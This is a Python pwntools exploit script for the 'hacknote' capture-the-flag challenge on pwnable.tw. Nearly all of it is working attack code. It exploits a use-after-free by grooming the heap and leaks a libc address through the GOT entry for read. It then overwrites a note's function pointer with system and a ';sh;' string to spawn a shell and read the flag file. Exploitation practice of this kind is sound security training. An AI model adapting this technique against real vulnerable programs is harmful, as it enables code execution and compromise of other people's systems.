#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/hacknote'
REMOTE = ['chall.pwnable.tw', 10102]

PROG = ELF(LOCALE)
LIBC = ELF('./files/libc_32.so.6')

ENV = {'LD_PRELOAD': LIBC.path}
_LD = './files/ld-2.23.so'

context.binary = LOCALE
context.binary.checksec()
context.terminal = ['tmux', 'splitw', '-h']

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process([_LD, LOCALE], env=ENV)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################


def menu(option):
    p.sendafter("Your choice :", str(option))


def add_note(content, size=None):
    menu(1)
    p.sendafter('Note size :', str(len(content) if size is None else size))
    p.sendafter('Content :', content)
    return p.readline()


def delete_note(index):
    menu(2)
    p.sendafter('Index :', str(index))
    return p.readline()


def print_note(index):
    menu(3)
    p.sendafter('Index :', str(index))
    return p.readline()


GDB_INIT = '''
b *0x08048a85
b system

add-symbol-file ./files/structs.o 0

set $n0 = ( struct Note_t * ) *0x0804a050
set $n1 = ( struct Note_t * ) *0x0804a054
set $n2 = ( struct Note_t * ) *0x0804a058
set $n3 = ( struct Note_t * ) *0x0804a05c
set $n4 = ( struct Note_t * ) *0x0804a060

define hook-stop

    echo \\n\\n---------------------------------- HEAP ----------------------------------\\n
    x/64wx 0x2aaab000

    echo \\n\\n--------------------------------- NOTE 0 ---------------------------------\\n
    p $n0
    p ($n0) ? *$n0 : ""

    echo \\n\\n--------------------------------- NOTE 1 ---------------------------------\\n
    p $n1
    p ($n1) ? *$n1 : ""

    echo \\n\\n--------------------------------- NOTE 2 ---------------------------------\\n
    p $n2
    p ($n2) ? *$n2 : ""

    echo \\n\\n--------------------------------- NOTE 3 ---------------------------------\\n
    p $n3
    p ($n3) ? *$n3 : ""

    echo \\n\\n--------------------------------- NOTE 4 ---------------------------------\\n
    p $n4
    p ($n4) ? *$n4 : ""

    echo \\n\\n

end

c
'''

#context.log_level = 'debug'
#gdb.attach(p, GDB_INIT)

with log.progress('Massaging the heap') as l:
    l.status('Adding notes at 0 and 1')
    add_note('A' * 16)
    add_note('B' * 16)

    l.status('Free-ing notes at 0 and 1')
    delete_note(0)
    delete_note(1)

    l.status('Overwriting content of note at 0')
    add_note(p32(0x0804862b) + p32(PROG.got['read']))

    l.success()

with log.progress('Leaking libc address') as l:
    leak = print_note(0)
    LIBC_BASE = u32(leak[:4]) - LIBC.symbols['read']

    l.success(hex(LIBC_BASE))

SYSTEM = LIBC_BASE + LIBC.symbols['system']

with log.progress('Massaging again') as l:
    l.status('Deleting note at 2')
    delete_note(2)

    l.status('Overwriting content of note at 0')
    add_note(p32(SYSTEM) + ";sh;")

    l.success()

with log.progress('Reading flag') as l:
    menu(3)
    p.sendlineafter(':', '0')
    p.sendline('cat /home/hacknote/flag')
    l.success(p.recvline().strip())

p.close()
